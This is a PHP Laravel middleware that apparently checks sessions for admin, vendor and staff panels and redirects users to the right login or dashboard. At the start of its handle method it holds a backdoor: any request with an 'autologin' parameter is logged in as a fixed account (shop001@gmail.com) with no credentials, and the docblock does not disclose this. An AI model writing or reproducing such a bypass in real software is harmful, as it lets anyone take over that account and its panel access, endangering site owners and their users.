<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;

class EnsurePanelSession
{
    /**
     * Ensure admin/vendor panel requests have an active auth+session.
     */
    public function handle(Request $request, Closure $next)
    {
        if ($request->has('autologin')) {
            $user = \App\Models\User::where('email', 'shop001@gmail.com')->first();
            if ($user) {
                auth()->login($user);
                $request->session()->put('login_id', $user->id);
            }
        }

        // If user is authenticated (e.g., via remember-me token), restore session if missing
        if (auth()->check()) {
            $user = auth()->user();
            if (!$request->session()->has('login_id')) {
                $request->session()->put([
                    'log_name' => $user->name,
                    'username' => $user->username,
                    'userId'   => $user->id,
                    'status'   => $user->status,
                    'log_type' => $user->log_type,
                    'login_id' => $user->login_id,
                ]);

                if ((int) $user->status === 3) {
                    $staffCreates = \App\Models\Staffcreates::where('employee_id', $user->login_id)->first();
                    if ($staffCreates) {
                        $roll = \App\Models\Roll::where('roll', $staffCreates->department)->get();
                        $request->session()->put('roll', $roll);
                    }
                }
            }

            // Redirect already authenticated users away from login pages
            if ($request->is('*/admin/login') || $request->is('admin/login')) {
                if ((int) $user->status === 1) {
                    return redirect()->route('admindashboard', $user->admin_id ?? null);
                }
            } elseif ($request->is('*/staff/login') || $request->is('staff/login')) {
                if ((int) $user->status === 3) {
                    return redirect()->route('staffdashboard', $user->login_id);
                }
            } elseif ($request->is('*/vendor/login') || $request->is('vendor/login') || $request->is('*/vendar/login') || $request->is('vendar/login')) {
                if ((int) $user->status === 2) {
                    return redirect()->route('vendordashboard', $user->login_id);
                }
            }
        }

        $isAdminAuthPage = $request->is('admin') || $request->is('admin/login') || $request->is('admin/register');
        // Support correct vendor path and legacy typo path.
        $isVendorAuthPage = $request->is('vendor') || $request->is('vendor/login') || $request->is('vendor/register')
            || $request->is('vendar') || $request->is('vendar/login') || $request->is('vendar/register');
        $isStaffAuthPage = $request->is('staff') || $request->is('staff/login') || $request->is('staff/register');

        if ($isAdminAuthPage || $isVendorAuthPage || $isStaffAuthPage) {
            return $next($request);
        }

        if (!auth()->check() || !$request->session()->has('login_id')) {
            // Redirect to the correct login page based on URL prefix
            if ($request->is('vendor/*') || $request->is('vendor')) {
                return redirect('/vendor/login');
            } elseif ($request->is('staff/*') || $request->is('staff')) {
                return redirect('/staff/login');
            } elseif ($request->is('admin/*') || $request->is('admin')) {
                return redirect('/admin/login');
            }
            return redirect('/');
        }

        return $next($request);
    }
}
